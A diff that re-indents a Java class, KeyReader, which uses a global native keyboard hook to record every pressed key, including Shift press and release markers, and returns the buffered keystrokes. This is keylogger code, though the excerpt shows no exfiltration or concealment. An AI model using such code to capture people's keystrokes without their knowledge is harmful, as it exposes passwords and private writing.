@@ -11,59 +11,59 @@ import static kisonar.platform.domain.BaseDefinitions.SPACE;
 
 public class KeyReader implements NativeKeyListener {
 
-      private final List<String> readSigns;
+    private final List<String> readSigns;
 
-      public KeyReader() {
-            readSigns = new ArrayList<>();
-      }
+    public KeyReader() {
+        readSigns = new ArrayList<>();
+    }
 
-      @Override
-      public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-            collectKeyEvent(nativeKeyEvent, true);
-      }
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
+        collectKeyEvent(nativeKeyEvent, true);
+    }
 
-      @Override
-      public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
-            collectKeyEvent(nativeKeyEvent, false);
-      }
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
+        collectKeyEvent(nativeKeyEvent, false);
+    }
 
-      @Override
-      public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
-      }
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
+    }
 
-      public List<String> getCollectedKeys() {
-            List<String> result = List.copyOf(readSigns);
-            readSigns.clear();
-            return result;
-      }
+    public List<String> getCollectedKeys() {
+        List<String> result = List.copyOf(readSigns);
+        readSigns.clear();
+        return result;
+    }
 
-      private void collectKeyEvent(NativeKeyEvent nativeKeyEvent, boolean keyPressed) {
-            String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-            if (keyPressed) {
-                  if (isSpace(keyText)) {
-                        keyText = SPACE;
-                  }
-                  if (isShift(keyText)) {
-                        keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_PRESSED);
-                  }
-                  readSigns.add(keyText);
-            } else {
-                  if (isShift(keyText)) {
-                        keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_RELEASED);
-                        readSigns.add(keyText);
-                  }
+    private void collectKeyEvent(NativeKeyEvent nativeKeyEvent, boolean keyPressed) {
+        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
+        if (keyPressed) {
+            if (isSpace(keyText)) {
+                keyText = SPACE;
             }
-      }
+            if (isShift(keyText)) {
+                keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_PRESSED);
+            }
+            readSigns.add(keyText);
+        } else {
+            if (isShift(keyText)) {
+                keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_RELEASED);
+                readSigns.add(keyText);
+            }
+        }
+    }
 
-      private String generateShiftEntry(String entry) {
-            return SPACE + entry + SPACE;
-      }
+    private String generateShiftEntry(String entry) {
+        return SPACE + entry + SPACE;
+    }
 
-      private boolean isSpace(String keyText) {
-            return keyText.equalsIgnoreCase("space");
-      }
+    private boolean isSpace(String keyText) {
+        return keyText.equalsIgnoreCase("space");
+    }
 
-      private boolean isShift(String keyText) {
-            return keyText.equalsIgnoreCase("shift");
-      }
+    private boolean isShift(String keyText) {
+        return keyText.equalsIgnoreCase("shift");
+    }
 }
